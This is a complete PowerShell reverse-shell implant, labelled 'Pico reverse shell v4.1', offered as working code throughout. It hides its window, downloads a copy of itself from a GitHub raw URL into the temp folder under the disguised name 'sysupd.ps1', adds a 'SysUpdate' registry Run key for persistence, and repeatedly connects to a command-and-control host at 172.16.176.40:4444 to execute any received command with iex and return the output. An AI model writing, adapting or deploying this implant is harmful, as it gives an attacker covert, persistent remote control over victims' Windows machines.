# Pico reverse shell v4.1 - Fixed Loop & Logic
# C2: 172.16.176.40:4444

# 1. Hide the PowerShell Window
$m = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@ -PassThru
$m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# 2. Persistence Setup (HKCU Run Key)
$gh = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1'
$tmp = "$env:TEMP\sysupd.ps1"
$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

if (-not (Test-Path $tmp)) { 
    try { Invoke-WebRequest $gh -OutFile $tmp -UseBasicParsing } catch {} 
}
if (-not (Get-ItemProperty $reg -Name "SysUpdate" -ErrorAction SilentlyContinue)) { 
    Set-ItemProperty $reg -Name "SysUpdate" -Value "powershell.exe -WindowStyle Hidden -File $tmp" 
}

# 3. Main Reverse Shell Loop
while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
        $s = $c.GetStream()
        $e = New-Object System.Text.UTF8Encoding
        
        # Initial Connection Message
        $prompt = $e.GetBytes("Connected to $($env:COMPUTERNAME). Type 'kill' to remove persistence and exit.`nPS $PWD> ")
        $s.Write($prompt, 0, $prompt.Length)

        [byte[]]$b = New-Object byte[] 65535
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $d = $e.GetString($b, 0, $i).Trim()
            
            # --- Kill Logic (Now inside the loop) ---
            if($d -eq 'kill') {
                $msg = $e.GetBytes("Cleaning up and exiting...`n")
                $s.Write($msg, 0, $msg.Length)
                
                # Remove Registry Persistence
                Remove-ItemProperty -Path $reg -Name "SysUpdate" -Force -ErrorAction SilentlyContinue
                # Note: Cannot delete $tmp while script is running, but we stop the process
                Stop-Process -Id $PID -Force
            }

            # --- Command Execution ---
            # Using try/catch inside iex to prevent the whole shell from crashing on bad syntax
            $out = try { 
                if ($d) { iex $d 2>&1 | Out-String } else { "" } 
            } catch { $_.Exception.Message }

            # Send Output + New Prompt
            $response = $e.GetBytes($out + "`nPS $PWD> ")
            $s.Write($response, 0, $response.Length)
            $s.Flush()
        }
        $c.Close()
    }
    catch { 
        # Wait 5 seconds before retrying if C2 is down
        Start-Sleep 5 
    }
}
